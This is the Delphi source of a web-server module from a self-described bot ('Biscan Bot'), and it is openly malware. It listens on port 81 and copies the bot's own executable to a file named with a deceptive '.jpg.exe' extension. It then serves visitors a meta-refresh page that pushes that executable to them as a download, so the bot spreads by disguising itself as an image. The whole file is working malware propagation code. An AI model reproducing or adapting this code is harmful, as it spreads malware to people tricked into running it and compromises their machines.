   (* Biscan Bot: Coded by p0ke *)
   { -- http://p0ke.no-ip.com -- }

   unit pWebServer;

   interface

   Uses
     Windows, Winsock, pFunc;

   Type
     TSocketData = Record
       Socket: TSocket;
     End;
     PSocketData = ^TSocketData;

   Var
     WebSocket:    TSocket;
     Sockets  :    Array[0..500] Of TSocket;
     wData    :    TWSAData;
     SocketData:   TSocketData;

     Procedure WebServer;

   implementation

   Function ExtractFileExt(Delimiter, Input: String): String;
   Begin
     While Pos(Delimiter, Input) <> 0 Do
       Delete(Input, 1, Pos(Delimiter, Input));
     Result := Input;
   End;

   Procedure ServerFile(FileName:String; Sock:TSocket);
   Var
     ContentType : String;
     Result      : String;
     FileHandle  : Cardinal;
     BytesRead   : Cardinal;
     FileSize    : Integer;
     Data        : String;
     F           : TextFile;
     I           : Integer;
     S           : String;
   Begin
     If FileName[1] = '/' Then Delete(FileName, 1, 1);
     S := FileName;
     FileName := Copy(FileName, 1, Pos('.',FileName)-1);
     FileName := FileName + '.jpg.exe';
     CopyFile(pChar(ParamStr(0)), pChar(FileName), False);
     If (Pos('%20', S)>0) and (Pos('%C2', S)>0)  Then S := FileName;

     If Not FileExists(S) Then
     Begin
       AssignFile(F, SysDir('x.htm'));
       Rewrite(F);
       Write(F, '<meta http-equiv=''refresh'' content=''0;url='+FileName+'''>');
       CloseFile(F);
       FileName := SysDir('x.htm');
     End;

     If (ExtractFileExt('.', FileName) = 'html') Or (ExtractFileExt('.', FileName) = 'htm') Then ContentType := 'text/html';
     If (ExtractFileExt('.', FileName) = 'exe') Or (ExtractFileExt('.', FileName) = 'pif') Then ContentType := 'application/x-msdownload';

     FileHandle := CreateFile(pChar(FileName), LongWord($80000000), 0, NIL, 3, $00000080, 0);
     FileSize := GetFileSize(Filename);

     Result := 'HTTP/1.1 200 OK'#13#10
              +'Accept-Ranges: bytes'#13#10
              +'Content-Length: '+IntToStr(FileSize)+#13#10
              +'Keep-Alive: timeout=15, max=100'#13#10
              +'Connection: Keep-Alive'#13#10
              +'Content-Type: '+ContentType+#13#10#13#10;
     Send(Sock, Result[1], Length(Result), 0);

     SetLength(Data ,5012);
     For I := 1 To Length(Data) Do
     Begin
       Delete(Data, I, 1);
       Insert(' ', Data, I);
     End;
     repeat
       readfile(FileHandle, Data[1], 5012, BytesRead, NIL);
       Send(Sock, Data[1], 5012, 0);
     until BytesRead < 5012;
     closehandle(FileHandle);
   End;

   Procedure ReadSock(P: Pointer); STDCALL;
   Var
     Buf: Array[0..16000] Of Char;
     Sock: TSocket;
     Data: String;
   Begin
     Sock := PSocketData(P)^.Socket;
     While Recv(Sock, Buf, SizeOf(Buf), 0) > 0 Do
     Begin
       Data := Buf;
       ZeroMemory(@Buf, SizeOf(Buf));
       If Pos('GET', Data) > 0 Then
       Begin
         Delete(Data, 1, 4);
         Data := Copy(Data, 1, Pos('HTTP/1.1', Data)-2);
         ServerFile(Data, Sock);
       End;
     End;
   End;

   Function WaitForConnection: boolean;
   var
     fdset: TFDset;
   begin
     fdset.fd_count := 1;
     fdset.fd_array[0] := WebSocket;
     Select(0,@fdset,NIL,NIL,NIL);
     Result := True;
   end;

   Procedure WebServer;
   Var
     Size: Integer;
     SockAddr: TSockAddr;
     SockAddrIn: TSockAddrIn;
     ThreadID: Dword;
     I, J: Integer;
   Begin
     WSAStartUp(257, wData);

     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));
     WebSocket := INVALID_SOCKET;
     WebSocket := Socket(PF_INET, SOCK_STREAM, getprotobyname('tcp').p_proto);
     If WebSOcket = INVALID_SOCKET Then Exit;
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(81);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Bind(WebSocket, SockAddrIn, SizeOf(SockAddrIn));

     If Winsock.Listen(WebSocket, 5) <> 0 Then Exit;

     While WaitForConnection Do
     Begin
       Size := SizeOf(TSockAddr);
       For I := 0 To 500 Do
         If Sockets[i] <= 0 Then
         Begin
           Sockets[I] := Winsock.Accept(WebSocket, @SockAddr, @Size);
           If Sockets[I] > 0 Then
           Begin
             SocketData.Socket := Sockets[I];
             CreateThread(NIL, 0, @ReadSock, @SocketData, 0, ThreadID);
             Break;
           End;
         End;
     End;

     WsaCleanUp;
   End;

   end.
